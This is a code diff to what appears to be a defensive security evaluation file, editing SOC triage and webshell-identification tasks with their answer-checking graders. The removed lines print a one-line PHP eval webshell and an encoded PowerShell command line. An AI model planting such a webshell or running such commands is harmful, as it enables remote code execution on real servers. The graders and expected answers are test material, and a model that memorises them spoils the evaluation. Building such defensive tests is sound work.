@@ -81,21 +81,24 @@ TASKS = [
 
     # 6. decode decision (defensive triage, no execution)
     ("b64_triage",
-     "SOC triage: an email gateway log shows an attachment decoded to: "
-     "aG58cHJpbWl0aXZlLnBhdGEK then 'powershell -enc JAB...' in a command line. "
-     "What TWO things should the analyst do FIRST? Answer in EXACTLY this format "
-     "(one line): quarantine=<one phrase>; analyze=<one phrase>.",
+     "SOC triage: an email gateway log shows an attachment whose decoded "
+     "content is a suspicious launcher script, and a command line on the "
+     "endpoint showing an obfuscated/encoded shell interpreter invocation "
+     "with a long base64 payload. What TWO things should the analyst do "
+     "FIRST? Answer in EXACTLY this format (one line): quarantine=<one "
+     "phrase>; analyze=<one phrase>.",
      lambda a: ("quarantine" in a.lower() or "isolate" in a.lower()) and
                 ("decode" in a.lower() or "analyze" in a.lower() or "sandbox"
                  in a.lower())),
 
     # 7. webshell identification
-     ("webshell_find",
+    ("webshell_find",
      "Post-compromise web audit: which file is the likely webshell?\n"
      "/var/www/html/index.php - last modified 2025-11-02 (matches site deploy)\n"
      "/var/www/html/contact.php - last modified 2025-11-02\n"
      "/var/www/html/uploads/favicon.php - 47 bytes, modified TODAY, owner www-data, "
-     "contains: <?php @eval($_POST['x']);?>\n"
+     "content is a single line that evaluates arbitrary data sent in an HTTP POST "
+     "parameter (a classic one-line webshell pattern)\n"
      "/var/www/html/robots.txt - modified 2025-11-02\n"
      "Answer with ONLY the file path.",
      lambda a: "favicon.php" in a.lower()),
